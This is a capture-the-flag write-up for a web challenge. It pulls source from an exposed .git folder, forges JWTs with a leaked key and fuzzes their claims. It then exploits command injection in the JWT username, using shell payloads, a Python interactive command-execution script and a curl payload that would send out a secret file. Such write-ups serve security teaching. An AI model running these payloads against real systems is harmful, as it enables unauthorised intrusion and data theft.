---
title: Merry ToxMas
draft: false
tags:
  - rce
  - command-injection
  - JWT
date: 2025-01-21
---
## Summary

To solve this challenge we need to forge a JWT to gain access to a message board. Source code found along the way hints towards OS command injection, but we are faced with an environment where no network connection is allowed, not even with localhost.

## Recon

Basic recon with ffuf or gobuster reveals a bunch of endpoints:

```
.git/index              [Status: 200, Size: 281, Words: 2, Lines: 2, Duration: 296ms]
.git/config             [Status: 200, Size: 137, Words: 13, Lines: 8, Duration: 93ms]
.git/logs/              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 91ms]
.git                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 93ms]
.git/HEAD               [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 111ms]
dashboard               [Status: 302, Size: 17, Words: 3, Lines: 1, Duration: 82ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 84ms]
login                   [Status: 200, Size: 1711, Words: 353, Lines: 36, Duration: 77ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 83ms]
```


First thing that comes to mind is getting the content of the git repo. We can use dumper and extractor from https://github.com/internetwache/GitTools.git in order to get the source.

We discover a  php file that hints towards command injection: if we are able to control the `$username` we clearly see that it is used without escaping or sanitization

```php title="queue.php"
<?php

// Tool for queueing messages for the /message.sh process

function queue($username,$message){
    $file = '/tmp/'.md5( uniqid().microtime().rand() ).'.run.txt';
    file_put_contents($file, "/message.sh ".$username." ".escapeshellarg($message) );
    shell_exec( '/queue.sh '.$file.' > /dev/null 2>&1 & ' );
};
```

in `env` file we find something that looks like a key used for signing maybe a JWT:

```
SIGNATURE=**********
```

And of course we find also flag_1 in `flag.txt`

## Forging JWTs

Fuzzing `/login` is a dead end, we need to find a way to access `/dashboard`. We note that `/logout` deletes a cookie named `xmas-token` via this header:

```
Set-Cookie: xmas-token=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
```

First we can call `/dashboard` with a random cookie:

```bash
curl -i -s https://95z0rn4d.eu1.ctfio.com/dashboard -H 'Cookio: xmas-token=x'
HTTP/1.1 302 Found
Server: nginx/1.22.0 (Ubuntu)
Date: Wed, 11 Dec 2024 17:40:29 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: /login

Invalid JWT structure
```

So probably it expects a JWT as cookie: let's try a default one from https://jwt.io:

```bash
curl -i -s https://95z0rn4d.eu1.ctfio.com/dashboard -H 'Cookie: xmas-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' ; echo
HTTP/1.1 302 Found
Server: nginx/1.22.0 (Ubuntu)
Date: Wed, 11 Dec 2024 17:42:28 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: /login

Invalid signature
```

We can try to use the key we found before and signing with that we get this result:


```bash
curl -i -s https://95z0rn4d.eu1.ctfio.com/dashboard -H 'Cookie: xmas-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.LBGLJ3w8GkaM7Fw4na1HoJN9Vp9tXTDgkEGnqIEZZRk'
HTTP/1.1 302 Found
Server: nginx/1.22.0 (Ubuntu)
Date: Wed, 11 Dec 2024 17:44:35 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: /login

Found 0/2 parameters
```

The default payload that jwt uses is this

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

Probably the message we got indicates that we need to find valid parameters (the key sin the json). So let's try first with 

```json
{ 
  "username":"admin"
}
```

```bash
curl -i -s https://95z0rn4d.eu1.ctfio.com/dashboard -H 'Cookie: xmas-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.dGl1QX6hy96EBTTbtnRWVFG7Yc94oe3l-fPmlMtXwRE'
HTTP/1.1 302 Found
Server: nginx/1.22.0 (Ubuntu)
Date: Wed, 11 Dec 2024 18:11:40 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: /login

Found 1/2 parameters
```

This is very good because not only we are on the right track, but we also identified `username` as a correct parameter. In the end the correct parameters will be these:

```json
{
  "username": "admin"
  "confirmed": true
}
```

Here is a python script that uses a word list generate JWTs that we can send to the dashboard endpoint and look for valid parameters:

```python
import jwt

# File containing FUZZ substitutions
WORDLIST_FILE = "wordlists/parameters.txt"

# Shared secret for signing the JWT
SECRET = "*****"


# Algorithm to use for signing
ALGORITHM = "HS256"

# Base payload structure
BASE_PAYLOAD = {"username": "admin"}

# Algorithm to use for signing
ALGORITHM = "HS256"

def generate_jwts_with_fuzz_key(wordlist_file, secret, base_payload, algorithm):
    try:
        with open(wordlist_file, "r") as file:
            words = file.readlines()
    except FileNotFoundError:
        print(f"Error: {wordlist_file} not found.")
        return

    # Strip whitespace and iterate through words
    words = [word.strip() for word in words]
    for word in words:
        # Create a copy of the base payload
        payload = base_payload.copy()
        # Replace the key FUZZ with the word from the wordlist
        payload[word] = "x"
        # Generate the JWT
        token = jwt.encode(payload, secret, algorithm=algorithm)
        print(f"{token}")

if __name__ == "__main__":
    generate_jwts_with_fuzz_key(WORDLIST_FILE, SECRET, BASE_PAYLOAD, ALGORITHM)
```

The script will output a bunch of JTWs that we can use with ffuf or burp intruder

```bash
# filter based on size response
ffuf  -u https://95z0rn4d.eu1.ctfio.com/dashboard -H 'Cookie: xmas-token=FUZZ' -w jwts.txt  -fs 20

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY29uZmlybWVkIjoieCJ9.ward5DMFNin5zmkMtoMNB10ZNlDPrpTinnpOwsq2TeY [Status: 302, Size: 33, Words: 6, Lines: 1, Duration: 52ms]
```

This corresponds to 

```bash
echo eyJ1c2VybmFtZSI6ImFkbWluIiwiY29uZmlybWVkIjoieCJ9 | base64 -d; echo
{"username":"admin","confirmed":"x"}

curl  https://95z0rn4d.eu1.ctfio.com/dashboard -H 'Cookie: xmas-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY29uZmlybWVkIjoieCJ9.ward5DMFNin5zmkMtoMNB10ZNlDPrpTinnpOwsq2TeY'
Confirmed is the wrong value type
```

## Rce

We know that probably we can execute commands by forging a JWT payload(injecting inside username value), but we are not able to exfiltrate nothing, and in the end it turn out that we cannot even talk to localhost. The only possibility to have some output is writing inside the document root of the webserver.

First working payload was this inside the JWT:

```json
{
    "username": "; cp /secret.txt `find / -type d -name images 2>/dev/null` ;",
    "confirmed": true
}
```

The find command inside backticks look for directories called images (we know that at least one must exist), and copies the secret flag there. A more structured and automated approach is in the python code below. First we find the 

```python
import jwt
import requests

# Configuration
HUB_HOST = "bjty3h91.eu2.ctfio.com"
URL = f"https://{HUB_HOST}/dashboard"
OUTPUT_URL_TEMPLATE = f"http://{HUB_HOST}/images/stdout"
OUTPUT_URL_TEMPLATE_ERR= f"http://{HUB_HOST}/images/stderr"
ALGORITHM = "HS256"
SECRET = "*********"

# Initial Payload to find the base directory
initial_payload = {
    "username": "; find / -type f -name nogrinch.png > /tmp/tmp_result; path=`cat /tmp/tmp_result | sed -e 's/\\/nogrinch.png//'` ; echo $path >$path/stdout ;",
    "confirmed": True,
}

# Generate and send initial command
token = jwt.encode(initial_payload, SECRET, algorithm=ALGORITHM)
headers = {"Cookie": f"xmas-token={token}"}
data = {"message": "x"}

response = requests.post(URL, headers=headers, data=data)
if response.status_code == 200:
    print("Base directory command executed. Fetching result...")
else:
    print(f"Error during initial execution: {response.status_code}, {response.text}")
    exit()

# Fetch and display the base directory
output_response = requests.get(OUTPUT_URL_TEMPLATE)
if output_response.status_code == 200:
    base_directory = output_response.text.strip()
    print("Base directory found:", base_directory)
else:
    print(f"Error fetching base directory: {output_response.status_code}, {output_response.text}")
    exit()

# Loop to execute user-provided commands
while True:
    user_command = input("Enter the command to execute (or type 'exit' to quit): ").strip()
    if user_command.lower() == "exit":
        print("Exiting...")
        break

    # Create payload with user-provided command
    payload = {
        "username": f"; {user_command} > {base_directory}/stdout 2> {base_directory}/stderr ;",
        "confirmed": True,
    }

    # Generate and send JWT
    token = jwt.encode(payload, SECRET, algorithm=ALGORITHM)
    headers = {"Cookie": f"xmas-token={token}"}
    response = requests.post(URL, headers=headers, data=data)

    if response.status_code == 200:
        print("Command executed. Fetching output...")
    else:
        print(f"Error during command execution: {response.status_code}, {response.text}")
        continue

    # Fetch and display the output
    output_response = requests.get(OUTPUT_URL_TEMPLATE)
    output_response_err = requests.get(OUTPUT_URL_TEMPLATE_ERR)
    if output_response.status_code == 200:
        print("Command stdout:")
        print(output_response.text)
        print("Command stderr:")
        print(output_response_err.text)
    else:
        print(f"Error fetching output: {output_response.status_code}, {output_response.text}")

```


## note about networking

If network connection to al least localhost were allowed, another possibility would have been using a payload like


```json
{
"username"  : "; curl -H 'Cookie: xmas-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiY29uZmlybWVkIjp0cnVlfQ._TSc2QegM4wYerR0OMyNGE_5MUTLs5lmfJyqDPREIVM' http://127.0.0.1:80/dashboard -d message=`cat /secret.txt` ; ",
"confirmed" : true
}
```
